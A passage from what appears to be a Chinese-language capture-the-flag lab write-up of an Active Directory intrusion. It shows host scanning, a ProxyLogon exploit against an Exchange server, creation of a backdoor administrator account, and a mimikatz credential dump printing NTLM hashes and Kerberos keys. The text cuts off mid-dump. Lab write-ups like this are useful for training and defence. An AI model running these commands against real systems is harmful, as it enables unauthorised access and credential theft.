class="line">172.22.3.2:139 open</span><br><span class="line">172.22.3.9:135 open</span><br><span class="line">172.22.3.26:135 open</span><br><span class="line">172.22.3.2:135 open</span><br><span class="line">172.22.3.9:81 open</span><br><span class="line">172.22.3.9:80 open</span><br><span class="line">172.22.3.2:88 open</span><br><span class="line">172.22.3.12:80 open</span><br><span class="line">172.22.3.12:22 open</span><br><span class="line">172.22.3.9:8172 open</span><br><span class="line">172.22.3.9:808 open</span><br><span class="line">[*] alive ports len is: 18</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.9</span><br><span class="line">   [-&gt;]XIAORANG-EXC01</span><br><span class="line">   [-&gt;]172.22.3.9</span><br><span class="line">[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.2</span><br><span class="line">   [-&gt;]XIAORANG-WIN16</span><br><span class="line">   [-&gt;]172.22.3.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.3.26</span><br><span class="line">   [-&gt;]XIAORANG-PC</span><br><span class="line">   [-&gt;]172.22.3.26</span><br><span class="line">[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          </span><br><span class="line">[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html</span><br><span class="line">[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP</span><br><span class="line">[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         eWindows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。</span><br><span class="line">[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None</span><br><span class="line">[*] WebTitle http://172.22.3.9         code:403 len:0      title:None</span><br><span class="line">[*] WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/</span><br><span class="line">[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook</span><br><span class="line">已完成 18/18</span><br><span class="line">[*] 扫描结束,耗时: 11.337402915s</span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.3.12     当前机器</span><br><span class="line">172.22.3.9      域内Exchange机</span><br><span class="line">172.22.3.2      域控</span><br><span class="line">172.22.3.26     域内机器</span><br></pre></td></tr></table></figure><p>172.22.3.9访问一下发现是Exchange Server 2016, 直接打<a href="https://github.com/hausec/ProxyLogon">ProxyLogon</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677739859-ab1feed1-0099-4700-987e-1c5f7e3dab06.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p>打完会弹一个system的Shell，我们添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user calm qwer1234! /add</span><br><span class="line">net localgroup administrators calm /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677900628-aeb0f513-da0f-45de-a19c-eb1a123e8dcd.png"></p><p>rdp上去拿flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677998198-941d6af2-b085-4420-9f41-75c9ce546bef.png"></p><p>上猕猴桃抓一下密码，记得管理员运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10598763 (00000000:00a1b96b)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 15:26:47</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : d8ab6a5ecc31f0ee092162f6b4cbbb42</span><br><span class="line"> * SHA1     : ba8a181c30dd83e3cb8c8d62315ae23163340479</span><br><span class="line"> * DPAPI    : 608ba79cc390d4c930b34bb0e2fd9c35</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10000700 (00000000:0098993c)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : calm</span><br><span class="line">Domain            : XIAORANG-EXC01</span><br><span class="line">Logon Server      : XIAORANG-EXC01</span><br><span class="line">Logon Time        : 2025/3/11 15:25:44</span><br><span class="line">SID               : S-1-5-21-804691931-3750513266-524628342-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * NTLM     : 6912928308e3cda903e6d75bd6091a20</span><br><span class="line"> * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9993321 (00000000:00987c69)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 15:25:43</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9993305 (00000000:00987c59)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 15:25:43</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2217558 (00000000:0021d656)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:49:24</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 2dd2fea458c9690609313e7d7c1d1094</span><br><span class="line"> * SHA1     : 710b23fb4ffb87bf98b5821e0e7a9b622e0a3283</span><br><span class="line"> * DPAPI    : 4bb9f57b64b8fb82bcaabba12708f6bb</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 108951 (00000000:0001a997)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:47:44</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line"> * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 66126 (00000000:0001024e)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:43</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 9587463cfa3fd1ea760c401e2c52e224</span><br><span class="line"> * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 12 ae e6 f2 22 80 c0 a3 cd 84 c9 94 de ef 96 52 79 ff ea 99 f6 9c 67 48 10 08 e7 99 1a fa 51 11 ad b6 c1 79 cc 6d 04 b2 22 01 47 b0 53 b5 7e ff df 04 21 34 ae 7b ee c9 cf b1 c1 d3 c0 63 d3 d7 6a f2 3a 38 83 ac cf d2 93 7b d3 0b bb d6 a5 8d 7c cd f1 77 65 0b 8c 77 dd 98 49 3c 21 f0 5d fc a7 8f c7 e0 5b f7 96 4d d2 46 14 81 8f 4f a7 a4 27 11 09 03 f9 f4 0d ce 71 4d 8d 64 c3 a9 6b 5c 4a 77 ba ac 33 1a 49 60 11 bd 4d b2 1e 98 05 1a c1 03 5b c6 cf 4e 1c d3 83 10 52 51 68 c4 b1 e0 65 c2 36 f3 a6 3f 66 c6 95 8c 3d 47 ab 9b cb 35 bd 53 f0 6f 13 ae 48 28 5e cf 5b ee 45 ce 7f 10 47 aa e6 f0 d3 09 c0 b3 ad ef 24 00 c5 c8 f0 7f a5 06 93 0e f5 a4 2a ec d0 25 96 4d a4 88 d3 55 94 d9 94 81 ef 8b ba 9e 89 b6 36 dc 88 64 8d 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 66047 (00000000:000101ff)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:43</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 